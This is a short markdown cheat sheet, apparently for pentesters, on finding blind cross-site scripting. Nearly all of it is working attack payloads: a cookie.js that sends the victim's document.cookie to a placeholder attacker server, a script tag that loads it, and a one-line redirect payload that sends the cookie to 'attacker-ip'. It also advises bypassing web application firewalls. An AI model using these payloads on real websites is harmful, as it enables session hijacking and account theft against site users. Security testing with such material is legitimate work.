# Identifing blind xss
### 1. Host a temorary http server(attacker server) with below file and paste the below code inside as cookie.js
<br/>
``` var request = new XMLHttpRequest();
request.open('GET', 'http://attacker-server-ip/?test='+document.cookie, true);
request.send() ``` <br/>

<br/>
### 2. Submit a payload which will render the above script
``` <script src="http://attacker-server-ip/cookie.js"></script> ```
Try to bypass the filters if there is any WAF

### 3. You will receive cookie on attacker-server

### Directly stealing the cookie(this may or may not work and try it with single quote & double quote and also bypass filter protection if WAF exist)
<script>document.location='http://attacker-ip/?c='+document.cookie</script>
